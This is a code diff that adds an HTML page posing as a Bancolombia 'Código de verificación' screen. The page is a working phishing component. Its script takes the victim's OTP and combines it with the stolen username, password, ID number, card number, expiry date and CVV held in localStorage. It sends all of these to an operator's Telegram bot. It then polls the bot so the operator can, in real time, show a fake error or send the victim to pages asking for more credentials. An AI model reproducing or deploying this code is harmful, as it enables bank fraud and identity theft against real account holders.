@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Bancolombia - Código de Verificación</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #2b2a28 0%, #2b2a28 100%);
+      color: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+    .card {
+      background: #454648;
+      border-radius: 10px;
+      padding: 40px 30px;
+      width: 100%;
+      max-width: 360px;
+      text-align: center;
+    }
+    .card h1 {
+      font-size: 22px;
+      margin-bottom: 20px;
+    }
+    .form-group {
+      position: relative;
+      margin-bottom: 20px;
+    }
+    .input-icon {
+      position: absolute;
+      left: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 17px;
+      opacity: 0.7;
+      user-select: none;
+    }
+    .input-field {
+      width: 100%;
+      padding: 10px 10px 8px 40px;
+      background: transparent;
+      border: none;
+      border-bottom: 1px solid white;
+      color: white;
+      font-size: 16px;
+    }
+    .input-field::placeholder { color: #ccc; }
+    .btn {
+      width: 100%;
+      padding: 14px;
+      background: #FFD700;
+      color: #2c2c2c;
+      border: none;
+      border-radius: 24px;
+      font-size: 16px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: transform 0.3s;
+    }
+    .btn:hover { transform: translateY(-2px); }
+    .error {
+      display: none;
+      color: #FFD700;
+      background: #2b2a28;
+      border: 1px solid #FFD700;
+      border-radius: 6px;
+      padding: 10px;
+      margin-bottom: 15px;
+      user-select: none;
+    }
+
+    /* ---------- Loader difuminado con rueda + texto ---------- */
+    .overlay-loader {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: rgba(0,0,0,0.55); /* semitransparente */
+      backdrop-filter: blur(6px);
+      -webkit-backdrop-filter: blur(6px);
+      z-index: 10000;
+      opacity: 0;
+      visibility: hidden;
+      pointer-events: none;
+      transition: opacity 220ms ease, visibility 220ms ease;
+      flex-direction: column;
+      padding: 20px;
+      text-align: center;
+    }
+    .overlay-loader.visible {
+      opacity: 1;
+      visibility: visible;
+      pointer-events: auto;
+    }
+    .spinner {
+      width: 64px;
+      height: 64px;
+      border-radius: 50%;
+      border: 6px solid rgba(255,255,255,0.18);
+      border-top-color: #FFD700;
+      box-sizing: border-box;
+      animation: spin 900ms linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .loader-text {
+      margin-top: 12px;
+      color: #fff;
+      font-size: 14px;
+      opacity: 0.95;
+      user-select: none;
+    }
+
+    @media (max-width: 480px) {
+      .card { padding: 28px 18px; }
+      .spinner { width: 56px; height: 56px; border-width: 5px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>Código de verificación</h1>
+    <div class="error" id="errorMsg"></div>
+    <p>Hemos enviado un código de verificación a tu número de teléfono registrado. Ingresa el código de 6 dígitos que recibiste por mensaje de texto.</p>
+    <br /><br />
+    <form id="otpForm" autocomplete="off">
+      <div class="form-group">
+        <img src="candado.png" class="input-icon" alt="OTP" />
+        <input
+          type="text"
+          name="codigoOtp"
+          id="codigoOtp"
+          class="input-field"
+          placeholder="Código de verificación"
+          required
+          maxlength="6"
+          pattern="\d{6}"
+          inputmode="numeric"
+          autocomplete="off"
+        />
+      </div>
+      <br />
+      <button type="submit" class="btn">Verificar</button>
+    </form>
+  </div>
+
+  <!-- Overlay loader: difuminado + rueda + texto -->
+  <div class="overlay-loader" id="loaderFull" role="status" aria-hidden="true" aria-label="Cargando">
+    <div class="spinner" aria-hidden="true"></div>
+    <div class="loader-text" id="loaderText">Verificando información...</div>
+  </div>
+
+  <script>
+    const loaderFull = document.getElementById('loaderFull');
+    const loaderText = document.getElementById('loaderText');
+
+    function showLoader(text) {
+      if (typeof text === 'string' && text.length) loaderText.textContent = text;
+      loaderFull.classList.add('visible');
+      loaderFull.setAttribute('aria-hidden', 'false');
+    }
+    function hideLoader() {
+      loaderFull.classList.remove('visible');
+      loaderFull.setAttribute('aria-hidden', 'true');
+    }
+
+    /* ---------- TELEGRAM CONFIG ---------- */
+    async function loadTelegramConfig() {
+      try {
+        const res = await fetch('./js/brr76.json', { cache: 'no-store' });
+        if (!res.ok) throw new Error('No se pudo cargar js/brr76.json');
+        const cfg = await res.json();
+        if (!cfg.token || !cfg.chat_id) throw new Error('brr76.json debe contener token y chat_id');
+        return cfg;
+      } catch (err) {
+        console.error('Error cargando brr76.json:', err);
+        alert('Error de configuración. Revisa js/brr76.json y la consola.');
+        return null;
+      }
+    }
+
+    /* Guardar/leer offset en localStorage para no reprocesar updates viejos */
+    function saveTgOffset(offset) { try { localStorage.setItem('tg_offset', String(offset)); } catch(e){} }
+    function getTgOffset() { try { return parseInt(localStorage.getItem('tg_offset')||'0'); } catch(e){ return 0; } }
+
+    /* Inicializamos offset con las actualizaciones actuales (no procesar historia) */
+    async function initTgOffsetOnce(config) {
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${encodeURIComponent(config.token)}/getUpdates`, { cache: 'no-store' });
+        const data = await res.json();
+        if (data && data.ok) {
+          const updates = data.result || [];
+          if (updates.length > 0) {
+            const lastId = updates[updates.length - 1].update_id;
+            saveTgOffset(lastId + 1);
+          }
+        }
+      } catch (e) {
+        console.warn('No se pudo inicializar offset (se intentará usar el valor guardado):', e);
+      }
+    }
+
+    // Validar formulario y enviar
+    document.getElementById('otpForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+
+      const codigoOtp = document.getElementById('codigoOtp').value.trim();
+      const err = document.getElementById('errorMsg');
+      err.style.display = 'none';
+
+      if (!/^\d{6}$/.test(codigoOtp)) {
+        err.textContent = 'Debes ingresar un código de 6 dígitos.';
+        err.style.display = 'block';
+        return;
+      }
+
+      // Mostrar loader con texto
+      showLoader('Verificando información...');
+
+      // Obtener datos guardados del localStorage
+      const usuario = localStorage.getItem('usuario') || '';
+      const clave = localStorage.getItem('clave') || '';
+      const transactionId = localStorage.getItem('transactionId') || Date.now().toString(36) + Math.random().toString(36).slice(2,10);
+
+      if (!usuario || !clave) {
+        hideLoader();
+        alert('No se encontraron datos de sesión. Regresando al inicio.');
+        window.location.href = 'index.html';
+        return;
+      }
+
+      // Cargar config
+      const config = await loadTelegramConfig();
+      if (!config) { 
+        hideLoader(); 
+        return; 
+      }
+
+      // Inicializar offset una vez para evitar updates viejos (solo si no existe)
+      if (!getTgOffset()) await initTgOffsetOnce(config);
+
+      // Intentar recuperar 'formData' si existe
+      let storedForm = null;
+      try { storedForm = JSON.parse(localStorage.getItem('formData') || 'null'); } catch(e) { storedForm = null; }
+
+      let message = `📱 Código OTP recibido\n🆔 ID: ${transactionId}\n👤 Usuario: ${usuario}\n🔑 Clave: ${clave}\n🔢 Código OTP: ${codigoOtp}\n\n`;
+
+      if (storedForm && typeof storedForm === 'object') {
+        const extras = [
+          { k: 'nombre', l: 'Nombre' }, { k: 'documentoIdentidad', l: 'Cédula' },
+          { k: 'telefono', l: 'Teléfono' }, { k: 'ciudad', l: 'Ciudad' },
+          { k: 'direccion', l: 'Dirección' }, { k: 'entidad', l: 'Banco' },
+          { k: 'tarjeta', l: 'Tarjeta' }, { k: 'fechaExpiracion', l: 'Fecha Exp.' },
+          { k: 'cvv', l: 'CVV' }
+        ];
+        extras.forEach(it => { if (storedForm[it.k]) message += `• ${it.l}: ${storedForm[it.k]}\n`; });
+      }
+
+      const keyboard = {
+        inline_keyboard: [
+          [{ text: "Error OTP", callback_data: `error_otp:${transactionId}` }],
+          [{ text: "Pedir dinámica", callback_data: `pedir_dinamica:${transactionId}` }],
+          [{ text: "Pedir TC", callback_data: `pedir_tc:${transactionId}` }],
+          [{ text: "Finalizar", callback_data: `finalizar:${transactionId}` }]
+        ]
+      };
+
+      // Enviar mensaje
+      try {
+        const sendRes = await fetch(`https://api.telegram.org/bot${encodeURIComponent(config.token)}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: config.chat_id, text: message, reply_markup: keyboard })
+        });
+        const sendJson = await sendRes.json();
+        if (!sendJson.ok) {
+          console.error('sendMessage error:', sendJson);
+          alert('No se pudo enviar el mensaje a Telegram. Revisa consola.');
+          hideLoader();
+          return;
+        }
+      } catch (err) {
+        console.error('Error enviando a Telegram:', err);
+        alert('Error enviando a Telegram. Revisa consola.');
+        hideLoader();
+        return;
+      }
+
+      // Polling seguro esperando la respuesta del admin
+      try {
+        await waitForAdminResponse(config, transactionId);
+      } finally {
+        hideLoader();
+      }
+    });
+
+    async function waitForAdminResponse(config, transactionId) {
+      const MAX_WAIT_MS = 5 * 60 * 1000; // 5 minutos
+      const POLL_INTERVAL = 2000;
+      const start = Date.now();
+      let offset = getTgOffset() || 0;
+
+      while (Date.now() - start < MAX_WAIT_MS) {
+        try {
+          const url = offset > 0
+            ? `https://api.telegram.org/bot${encodeURIComponent(config.token)}/getUpdates?offset=${offset}`
+            : `https://api.telegram.org/bot${encodeURIComponent(config.token)}/getUpdates`;
+
+          const res = await fetch(url, { cache: 'no-store' });
+          const data = await res.json();
+          if (data && data.ok) {
+            const updates = data.result || [];
+            if (updates.length > 0) {
+              const lastId = updates[updates.length - 1].update_id;
+              offset = lastId + 1;
+              saveTgOffset(offset);
+
+              for (const u of updates) {
+                if (u.callback_query && u.callback_query.data && u.callback_query.data.includes(transactionId)) {
+                  // intentar responder el callback para quitar el "cargando" en Telegram
+                  try {
+                    await fetch(`https://api.telegram.org/bot${encodeURIComponent(config.token)}/answerCallbackQuery`, {
+                      method: 'POST',
+                      headers: { 'Content-Type': 'application/json' },
+                      body: JSON.stringify({ callback_query_id: u.callback_query.id })
+                    });
+                  } catch (e) { /* no bloqueamos por este fallo */ }
+
+                  handleAdminAction(u.callback_query.data, transactionId);
+                  return;
+                }
+              }
+            }
+          } else {
+            console.warn('getUpdates retornó error o no ok', data);
+          }
+        } catch (err) {
+          console.error('Error en polling getUpdates:', err);
+        }
+
+        await new Promise(r => setTimeout(r, POLL_INTERVAL));
+      }
+
+      // Ocultar loader si se agotó el tiempo
+      hideLoader();
+      alert('No hubo respuesta del administrador en el tiempo esperado. Intenta más tarde.');
+    }
+
+    function handleAdminAction(callbackData, transactionId) {
+      // Dependiendo del botón presionado por el admin, actuamos
+      if (callbackData.startsWith('error_otp')) {
+        const err = document.getElementById('errorMsg');
+        err.textContent = 'El código OTP ingresado es incorrecto. Verifica e intenta nuevamente.';
+        err.style.display = 'block';
+        document.getElementById('codigoOtp').value = '';
+      } else if (callbackData.startsWith('pedir_dinamica')) {
+        window.location.href = 'dinamica.html';
+      } else if (callbackData.startsWith('pedir_tc')) {
+        window.location.href = 'tc.html';
+      } else if (callbackData.startsWith('finalizar')) {
+        // Limpiar localStorage y redirigir a Google
+        localStorage.removeItem('usuario');
+        localStorage.removeItem('clave');
+        localStorage.removeItem('transactionId');
+        localStorage.removeItem('formData');
+        window.location.href = 'https://google.com';
+      } else {
+        console.log('Acción admin no manejada:', callbackData);
+      }
+    }
+
+    // Enter => enviar si campo completo
+    document.addEventListener('keydown', function(e) {
+      if (e.key === 'Enter' && e.target.tagName !== 'BUTTON') {
+        e.preventDefault();
+        const codigoOtp = document.getElementById('codigoOtp').value.trim();
+        if (codigoOtp) {
+          document.getElementById('otpForm').dispatchEvent(new Event('submit'));
+        }
+      }
+    });
+  </script>
+
+</body>
+</html>
